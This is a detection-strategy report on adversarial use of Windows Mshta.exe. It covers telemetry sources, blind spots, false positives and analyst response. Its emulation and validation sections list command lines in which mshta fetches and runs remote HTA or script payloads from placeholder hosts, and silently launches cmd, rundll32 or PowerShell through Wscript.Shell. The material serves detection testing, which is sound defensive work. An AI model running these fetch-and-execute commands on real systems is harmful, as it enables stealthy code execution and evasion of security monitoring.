# Alerting & Detection Strategy (ADS) Report: Detecting Adversarial Use of `Mshta.exe`

## Goal
The primary goal of this technique is to detect adversarial attempts to bypass security monitoring using the Windows `Mshta.exe` utility. By leveraging this tool, adversaries execute scripts that can evade detection mechanisms and facilitate malicious activities such as code execution, persistence establishment, or lateral movement.

## Categorization

- **MITRE ATT&CK Mapping:** [T1218.005 - Mshta](https://attack.mitre.org/techniques/T1218/005)
- **Tactic / Kill Chain Phases:** Defense Evasion
- **Platforms:** Windows

## Strategy Abstract
This detection strategy leverages a combination of endpoint telemetry, network traffic analysis, and log monitoring to identify suspicious use of `Mshta.exe`. The primary data sources include:

- Event logs from Windows Security and Application events.
- Process monitoring data to observe unusual execution patterns.
- Network traffic analysis for anomalous communication.

Patterns analyzed will focus on unexpected combinations of command-line arguments, script executions, and network requests originating from `Mshta.exe`, particularly those that appear to be exploiting script-based vulnerabilities or remote execution paths.

## Technical Context
Adversaries utilize `Mshta.exe` to execute VBScript or JavaScript payloads as part of their attack vector. This utility is commonly used due to its ability to run scripts in memory, which can help bypass certain antivirus and endpoint detection mechanisms. In real-world scenarios, attackers may use it to:

- Execute remote HTML applications (HTAs).
- Fetch malicious code from remote servers.
- Initiate lateral movement within a network by exploiting script capabilities.

Adversaries often disguise their activities by embedding scripts in seemingly benign files or using less common protocols and techniques to avoid triggering standard detection mechanisms.

### Adversary Emulation Details
To emulate this technique, consider the following sample commands:

- **Executing VBScript via Mshta:**  
  `mshta vbscript:CreateObject("Wscript.Shell").Run("cmd /c <malicious_command>",0,True)`
  
- **Remote HTML Application Execution:**  
  `mshta http://example.com/malicious.hta`

## Blind Spots and Assumptions
- The detection strategy may miss novel or highly obfuscated script executions that do not follow typical patterns.
- Assumes a baseline of normal behavior for Mshta.exe in the environment, which might vary significantly between organizations.
- Limited visibility into encrypted network traffic could obscure some detections.

## False Positives
Potential benign activities that might trigger false alerts include:

- Legitimate administrative scripts executed using `Mshta.exe` for automation tasks.
- Development environments where script testing is a routine part of workflows.
- Use of legitimate remote management tools that utilize similar scripting techniques.

## Priority
**Severity: High**

Justification: The ability to execute scripts and bypass security measures poses significant risks, potentially leading to unauthorized access, data exfiltration, or further compromise of the network. Given its stealthy nature, detecting adversarial use of `Mshta.exe` is critical for maintaining robust defense mechanisms.

## Validation (Adversary Emulation)
Follow these steps in a controlled test environment to emulate this technique:

1. **Mshta Executes JavaScript Scheme Fetch Remote Payload With GetObject:**  
   Create and execute: `mshta vbscript:GetObject("script:http://example.com/malicious.js").exec()`

2. **Mshta Executes VBScript to Execute Malicious Command:**  
   Use the command: `mshta vbscript:CreateObject("Wscript.Shell").Run("<malicious_command>",0,True)`

3. **Mshta Executes Remote HTML Application (HTA):**  
   Run: `mshta http://example.com/malicious.hta`

4. **Invoke HTML Application - JScript Engine over Local UNC Simulating Lateral Movement:**  
   Execute: `mshta file:///\\path\to\network\share\malicious.hta`

5. **Invoke HTML Application - Jscript Engine Simulating Double Click:**  
   Use a script that triggers on user interaction: `mshta vbscript:WScript.CreateObject("WScript.Shell").Run("<command>",0,False)`

6. **Invoke HTML Application - Direct Download from URI:**  
   Command: `mshta http://example.com/malicious.hta`

7. **Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler:**  
   Example command: `mshta vbscript:CreateObject("WScript.Shell").Run("rundll32 <parameters>",0,True)`

8. **Invoke HTML Application - JScript Engine with Inline Protocol Handler:**  
   Execute: `mshta vbscript:GetObject("<protocol_handler>:<command>").exec()`

9. **Invoke HTML Application - Simulate Lateral Movement over UNC Path:**  
   Test: `mshta file:///\\path\to\network\share\malicious.hta`

10. **Mshta Used to Execute PowerShell:**  
    Command: `mshta vbscript:CreateObject("WScript.Shell").Run("powershell <command>",0,True)`

## Response
When the alert fires, analysts should:

- Immediately isolate affected systems from the network.
- Review logs for context and potential indicators of compromise (IoCs).
- Conduct a thorough investigation to determine the scope and impact.
- Remediate any identified malicious scripts or payloads.
- Update security policies and detection mechanisms to mitigate similar future threats.
